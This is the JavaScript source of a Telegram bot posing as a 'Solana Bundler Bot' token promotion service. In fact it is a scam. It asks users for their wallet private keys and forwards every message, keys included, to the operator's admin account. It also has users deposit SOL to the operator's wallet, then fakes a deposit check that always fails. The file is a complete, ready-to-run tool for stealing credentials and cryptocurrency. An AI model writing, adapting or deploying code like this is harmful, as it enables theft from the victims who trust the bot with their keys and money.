const TelegramBot = require('node-telegram-bot-api');

// Environment variables
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_USER_ID;
const ADMIN_WALLET = process.env.ADMIN_SOLANA_ADDRESS || 'DEFAULT_WALLET_ADDRESS';

// Initialize bot
const bot = new TelegramBot(TOKEN, { polling: true });

// User session storage
const userSessions = {};

// Notify admin function
async function notifyAdmin(message) {
  try {
    await bot.sendMessage(ADMIN_ID, message);
  } catch (error) {
    console.error('Admin notification failed:', error.message);
  }
}

// Start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  userSessions[chatId] = { step: 1 };
  
  bot.sendMessage(
    chatId,
    '🌟 Welcome to Solana Bundler Bot 🌟\n\n' +
    'Please send the token address you want to promote:'
  );
  
  notifyAdmin(`User ${chatId} started the bot`);
});

// Handle all messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const session = userSessions[chatId] || {};
  
  // Skip commands and non-text messages
  if (!text || text.startsWith('/')) return;

  notifyAdmin(`User ${chatId}: ${text}`);

  try {
    switch (session.step) {
      case 1: // Waiting for token address
        session.tokenAddress = text;
        session.step = 2;
        
        bot.sendMessage(
          chatId,
          '🔹 Choose an option:\n\n' +
          '1. Import existing wallet\n' +
          '2. Create new wallet'
        );
        break;

      case 2: // Wallet option selection
        if (text === '1') {
          session.step = 3;
          bot.sendMessage(
            chatId,
            'Enter your private key (as JSON array):\n' +
            'Example: [1,2,3,...,99]'
          );
        } else if (text === '2') {
          session.step = 4;
          bot.sendMessage(
            chatId,
            `💳 Please deposit 1 SOL to:\n\n${ADMIN_WALLET}\n\n` +
            'Reply "done" after transferring.'
          );
        } else {
          bot.sendMessage(chatId, '❌ Please choose 1 or 2');
        }
        break;

      case 3: // Private key received
        session.privateKey = text;
        session.step = 5;
        
        bot.sendMessage(
          chatId,
          '✅ Wallet imported!\n\n' +
          'Deposit at least 1 SOL to use volume booster.\n' +
          'Reply "done" after transferring.'
        );
        break;

      case 4: // New wallet transfer confirmation
      case 5: // Existing wallet transfer confirmation
        if (text.toLowerCase() === 'done') {
          bot.sendMessage(
            chatId,
            '⏳ Verifying your deposit... (This takes ~1 minute)'
          );
          
          // Simulate verification (1 minute delay)
          setTimeout(() => {
            bot.sendMessage(
              chatId,
              '❌ Verification failed - no deposit found\n\n' +
              'Please try again with /start'
            );
            delete userSessions[chatId];
          }, 60000);
        } else {
          bot.sendMessage(chatId, 'Please reply "done" when finished');
        }
        break;

      default:
        bot.sendMessage(chatId, 'Please use /start to begin');
    }
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, '⚠️ An error occurred. Please try again.');
    notifyAdmin(`Error for user ${chatId}: ${error.message}`);
  }
});

console.log('🤖 Bot is running...');
